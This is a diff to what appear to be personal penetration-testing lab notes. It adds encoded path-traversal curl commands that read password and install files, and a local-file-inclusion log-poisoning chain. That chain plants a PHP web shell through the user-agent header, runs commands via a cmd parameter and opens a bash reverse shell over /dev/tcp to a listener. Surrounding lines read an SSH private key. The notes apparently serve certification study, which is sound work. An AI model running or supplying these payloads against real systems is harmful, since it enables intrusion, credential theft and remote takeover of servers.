@@ -47,6 +47,16 @@ http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../etc
 ```
 http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../home/offsec/.ssh/id_rsa
 ```
+Encoded Chars
+```
+curl http://192.168.249.16/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/opt/passwords
+
+curl --path-as-is http://192.168.249.16/cgi-bin/%2F/%2F/%2F/%2F/%2F/%2F/opt/install.txt
+
+curl --path-as-is http://192.168.249.16:3000/public/plugins/alertlist/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/opt/install.txt
+
+```
+
 
 ## use their ssh key
 ```
@@ -60,6 +70,29 @@ ssh -i dt_key -p 2222 offsec@mountaindesserts.com
 curl --path-as-is http://192.168.249.193:3000/public/plugins/alertlist/../../../../../../../../Users/install.txt
 
 ```
+
+# LFI 
+Check First
+```
+curl http://192.168.241.X/meteor/index.php?page=../../../../../../var/log/apache2/access.log
+```
+Inject into burp as user agent string in php
+```
+<?php echo system($_GET['cmd']); ?>
+```
+inject into GET
+```
+/meteor/index.php?page=../../../../../../../../../var/log/apache2/access.log&cmd=ls%20-la
+
+# Rev Shell 8080
+GET /meteor/index.php?page=../../../../../../../../../var/log/apache2/access.log&cmd=bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.45.212%2F8080%200%3E%261%22
+# Windows type file
+GET /meteor/index.php?page=../../../../../../../xampp/apache/logs/access.log&cmd=type%20hopefullynobodyfindsthisfilebecauseitssupersecret.txt
+# execute php file
+GET /meteor/index.php?page=../../../../../../opt/admin.bak.php
+
+```
+
 
 # Checklist
 get application/version 
